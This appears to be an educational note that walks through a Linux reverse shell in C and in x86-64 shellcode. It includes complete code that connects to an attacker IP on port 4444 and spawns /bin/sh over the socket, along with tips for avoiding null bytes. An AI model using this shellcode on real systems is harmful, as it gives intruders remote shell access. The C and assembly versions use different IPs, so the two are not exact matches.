---

# 🐚 Reverse Shell: C to Assembly Notes

## 📌 Objective

Create a reverse shell that:

1. Connects to a remote attacker via TCP.
2. Redirects standard input/output/error to the socket.
3. Spawns a shell (`/bin/sh`).

---

## 🧠 Original C Code

```c
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    int socketfd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");

    connect(socketfd, (struct sockaddr *)&addr, sizeof(addr));

    dup2(socketfd, 0);
    dup2(socketfd, 1);
    dup2(socketfd, 2);

    execve("/bin/sh", NULL, NULL);
}
```

---

## 🧾 Corresponding Assembly (x86-64, Linux)

```asm
section .text
   global _start
_start:

    ; socket(AF_INET, SOCK_STREAM, 0)
    xor     rax, rax
    mov     al, 41            ; syscall: socket
    xor     rdi, rdi
    mov     dil, 2            ; AF_INET
    xor     rsi, rsi
    mov     sil, 1            ; SOCK_STREAM
    xor     rdx, rdx          ; protocol 0
    syscall                   ; return: sockfd → rax

    ; connect(sockfd, struct sockaddr*, addrlen)
    mov     rdi, rax          ; sockfd → arg1

    xor     rbx, rbx
    mov     rbx, 0x0801A8C0   ; 192.168.1.8 (little endian)
    push    rbx
    push    word 0x5C11       ; port 4444 (0x115c) htons
    push    word 2            ; AF_INET (sa_family)
    xor     rsi, rsi
    mov     rsi, rsp          ; pointer to sockaddr_in → arg2
    xor     rdx, rdx
    mov     dl, 16            ; size of sockaddr_in → arg3
    xor     rax, rax
    mov     al, 42            ; syscall: connect
    syscall

    ; dup2(sockfd, 0), dup2(sockfd, 1), dup2(sockfd, 2)
    xor     rax, rax
    mov     al, 33            ; syscall: dup2
    xor     rsi, rsi          ; fd 0
    syscall

    xor     rax, rax
    mov     al, 33
    inc     rsi               ; fd 1
    syscall

    xor     rax, rax
    mov     al, 33
    inc     rsi               ; fd 2
    syscall

    ; execve("/bin/sh", NULL, NULL)
    xor     rax, rax
    push    rax               ; null terminator
    xor     rbx, rbx
    mov     rbx, 0x68732f6e69622f2f ; "//bin/sh" in reverse
    push    rbx
    mov     al, 59            ; syscall: execve
    mov     rdi, rsp          ; filename
    xor     rsi, rsi          ; argv
    xor     rdx, rdx          ; envp
    syscall
```

---

## 🧮 Syscall Reference Table

| Function    | Syscall # | rdi (arg1)          | rsi (arg2)            | rdx (arg3)      |
| ----------- | --------- | ------------------- | --------------------- | --------------- |
| `socket()`  | 41        | domain (AF\_INET=2) | type (SOCK\_STREAM=1) | protocol (0)    |
| `connect()` | 42        | socketfd            | struct sockaddr ptr   | length (16)     |
| `dup2()`    | 33        | oldfd               | newfd                 | -               |
| `execve()`  | 59        | filename ptr        | argv ptr (NULL)       | envp ptr (NULL) |

---

## 📊 Stack Visualization (for sockaddr\_in and /bin/sh)

### `sockaddr_in` (struct pushed on stack)

```
Top of stack →
+-------------------+
| sa_family = 0x02  |  (word)
+-------------------+
| sin_port = 0x115C |  (word) → 4444 (network byte order)
+-------------------+
| sin_addr = 0xC0A80108 | → 192.168.1.8 (little endian)
+-------------------+
```

### `execve("/bin/sh", NULL, NULL)`

```
Top of stack →
+---------------------+
| 0x00 (null)         |  ← null terminator
+---------------------+
| "//bin/sh"          |  ← pushed as qword
+---------------------+
```

---

## 🧠 Notes on Register Usage

* **rax**: Syscall number
* **rdi**: 1st argument to syscall
* **rsi**: 2nd argument to syscall
* **rdx**: 3rd argument to syscall
* **rsp**: Stack pointer, used to pass data for structs and strings
* **rbx**: Temporary register for IP address or string construction

---

## ✅ Key Takeaways

* Avoid null bytes in shellcode by pushing data directly to the stack.
* Use immediate values and little-endian representation for IPs and ports.
* Use `xor` for zeroing registers (shorter and null-free).
* Reuse `rsi` to loop through `dup2()` for stdin, stdout, stderr.
* `execve()` must have all three arguments: path, argv (NULL), envp (NULL).

---

